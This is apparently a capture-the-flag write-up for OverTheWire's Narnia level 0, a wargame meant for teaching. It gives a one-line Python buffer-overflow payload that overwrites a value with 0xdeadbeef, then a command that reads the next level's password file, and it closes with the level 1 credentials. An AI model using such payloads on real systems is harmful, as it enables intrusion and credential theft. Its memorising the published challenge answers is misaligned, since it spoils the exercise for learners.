### Narnia Level 0

[narnia0](http://overthewire.org/wargames/narnia/narnia0.html)

**Username**: *narnia0*

**Password**: *narnia0*

#### Solution
```bash
(python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
cat /etc/narnia_pass/narnia1
```

#### Credentials for Level 1

**Username**: *narnia1*

**Password**: *efeidiedae*
